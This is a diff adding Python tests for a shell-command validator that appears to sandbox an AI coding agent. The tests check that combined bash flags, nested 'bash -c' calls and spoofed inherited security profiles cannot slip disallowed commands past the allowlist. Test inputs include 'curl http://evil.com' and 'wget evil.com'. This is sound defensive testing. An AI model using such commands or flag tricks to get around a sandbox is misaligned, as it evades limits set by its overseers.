@@ -1070,6 +1070,268 @@ class TestShellCValidator:
         allowed, reason = validate_bash_command("bash -c 'ls -la | npm run test'")
         assert allowed is False
 
+    def test_blocks_combined_xc_flag(self, tmp_path, monkeypatch):
+        """Blocks bash -xc with disallowed commands (combined flags bypass)."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Combined -xc flag should be detected and curl blocked
+        allowed, reason = validate_bash_command("bash -xc 'curl http://evil.com'")
+        assert allowed is False
+        assert "curl" in reason
+
+    def test_blocks_combined_ec_flag(self, tmp_path, monkeypatch):
+        """Blocks bash -ec with disallowed commands."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Combined -ec flag should be detected and wget blocked
+        allowed, reason = validate_bash_command("bash -ec 'wget evil.com'")
+        assert allowed is False
+        assert "wget" in reason
+
+    def test_blocks_combined_ic_flag(self, tmp_path, monkeypatch):
+        """Blocks bash -ic with disallowed commands (interactive + command)."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Combined -ic flag should be detected
+        allowed, reason = validate_bash_command("bash -ic 'npm run evil'")
+        assert allowed is False
+        assert "npm" in reason
+
+    def test_allows_combined_flags_with_allowed_commands(self, tmp_path, monkeypatch):
+        """Allows combined flags when inner command is allowed."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo", "pwd"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Combined flags with allowed commands should pass
+        allowed, reason = validate_bash_command("bash -xc 'echo hello'")
+        assert allowed is True
+
+    def test_blocks_nested_shell_invocation(self, tmp_path, monkeypatch):
+        """Blocks nested shell invocations with disallowed commands."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo", "bash", "sh"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Nested shell with disallowed command should be blocked
+        allowed, reason = validate_bash_command("bash -c 'bash -c \"curl http://evil.com\"'")
+        assert allowed is False
+        assert "curl" in reason or "nested" in reason.lower()
+
+    def test_allows_nested_shell_with_allowed_commands(self, tmp_path, monkeypatch):
+        """Allows nested shell invocations when all commands are allowed."""
+        from project.analyzer import ProjectAnalyzer
+
+        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
+
+        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
+
+        import json
+        profile_data = {
+            "base_commands": ["ls", "echo", "bash", "sh", "pwd"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(tmp_path),
+            "created_at": "",
+            "project_hash": actual_hash
+        }
+        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        reset_profile_cache()
+
+        # Nested shell with all allowed commands should pass
+        allowed, reason = validate_bash_command("bash -c 'bash -c \"echo hello\"'")
+        assert allowed is True
+
 
 class TestInheritedSecurityProfile:
     """Tests for inherited security profiles (worktree support).
@@ -1134,19 +1396,56 @@ class TestInheritedSecurityProfile:
         assert "inherited_from" not in data
 
     def test_should_reanalyze_skips_inherited_profiles(self, tmp_path):
-        """Tests that inherited profiles are never re-analyzed."""
+        """Tests that inherited profiles from valid parents are never re-analyzed."""
         from project.analyzer import ProjectAnalyzer
+        import json
 
-        # Create a profile with inherited_from set
+        # Set up a proper parent-child directory structure
+        parent_dir = tmp_path / "parent"
+        parent_dir.mkdir()
+        child_dir = parent_dir / "child"
+        child_dir.mkdir()
+
+        # Create a valid security profile in the parent
+        parent_profile_data = {
+            "base_commands": ["npm", "npx", "node"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(parent_dir),
+            "created_at": "",
+            "project_hash": "parent_hash"
+        }
+        (parent_dir / ".auto-claude-security.json").write_text(json.dumps(parent_profile_data))
+
+        # Create a profile with valid inherited_from pointing to actual parent
         profile = SecurityProfile(
             base_commands={"npm", "npx", "node"},
             project_hash="different_hash_that_would_normally_trigger_reanalysis",
-            inherited_from="/parent/project"
+            inherited_from=str(parent_dir)
         )
 
-        analyzer = ProjectAnalyzer(tmp_path)
+        analyzer = ProjectAnalyzer(child_dir)
 
         # Even though the hash doesn't match, should_reanalyze should return False
+        # because inherited_from points to a valid ancestor with a security profile
         assert analyzer.should_reanalyze(profile) is False
 
     def test_should_reanalyze_runs_for_non_inherited_profiles(self, tmp_path):
@@ -1163,3 +1462,123 @@ class TestInheritedSecurityProfile:
 
         # Hash won't match, so should_reanalyze should return True
         assert analyzer.should_reanalyze(profile) is True
+
+    def test_should_reanalyze_validates_inherited_from_path(self, tmp_path):
+        """Tests that inherited_from path is validated before trusting it."""
+        from project.analyzer import ProjectAnalyzer
+        import json
+
+        # Create a child directory structure
+        parent_dir = tmp_path / "parent"
+        parent_dir.mkdir()
+        child_dir = parent_dir / "child"
+        child_dir.mkdir()
+
+        # Create a valid parent profile
+        parent_profile_data = {
+            "base_commands": ["ls"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(parent_dir),
+            "created_at": "",
+            "project_hash": "abc123"
+        }
+        (parent_dir / ".auto-claude-security.json").write_text(json.dumps(parent_profile_data))
+
+        # Create a profile with valid inherited_from (child -> parent)
+        valid_profile = SecurityProfile(
+            base_commands={"ls"},
+            project_hash="different_hash",
+            inherited_from=str(parent_dir)
+        )
+
+        analyzer = ProjectAnalyzer(child_dir)
+
+        # Valid inherited_from should NOT trigger re-analysis
+        assert analyzer.should_reanalyze(valid_profile) is False
+
+    def test_should_reanalyze_rejects_invalid_inherited_from_path(self, tmp_path):
+        """Tests that invalid inherited_from path triggers re-analysis."""
+        from project.analyzer import ProjectAnalyzer
+
+        # Create a profile with invalid inherited_from (non-existent path)
+        invalid_profile = SecurityProfile(
+            base_commands={"ls"},
+            project_hash="different_hash",
+            inherited_from="/non/existent/path"
+        )
+
+        analyzer = ProjectAnalyzer(tmp_path)
+
+        # Invalid inherited_from should trigger re-analysis (falls back to hash check)
+        assert analyzer.should_reanalyze(invalid_profile) is True
+
+    def test_should_reanalyze_rejects_non_ancestor_inherited_from(self, tmp_path):
+        """Tests that non-ancestor inherited_from path triggers re-analysis."""
+        from project.analyzer import ProjectAnalyzer
+        import json
+
+        # Create two unrelated directories
+        dir_a = tmp_path / "dir_a"
+        dir_a.mkdir()
+        dir_b = tmp_path / "dir_b"
+        dir_b.mkdir()
+
+        # Create a profile in dir_a
+        profile_data = {
+            "base_commands": ["ls"],
+            "stack_commands": [],
+            "script_commands": [],
+            "custom_commands": [],
+            "detected_stack": {
+                "languages": [],
+                "package_managers": [],
+                "frameworks": [],
+                "databases": [],
+                "infrastructure": [],
+                "cloud_providers": [],
+                "code_quality_tools": [],
+                "version_managers": []
+            },
+            "custom_scripts": {
+                "npm_scripts": [],
+                "make_targets": [],
+                "poetry_scripts": [],
+                "cargo_aliases": [],
+                "shell_scripts": []
+            },
+            "project_dir": str(dir_a),
+            "created_at": "",
+            "project_hash": "abc123"
+        }
+        (dir_a / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+
+        # Create a profile pointing to dir_a from dir_b (not an ancestor)
+        spoofed_profile = SecurityProfile(
+            base_commands={"curl", "wget"},  # Dangerous commands
+            project_hash="different_hash",
+            inherited_from=str(dir_a)  # dir_a is not an ancestor of dir_b
+        )
+
+        analyzer = ProjectAnalyzer(dir_b)
+
+        # Non-ancestor inherited_from should trigger re-analysis
+        assert analyzer.should_reanalyze(spoofed_profile) is True
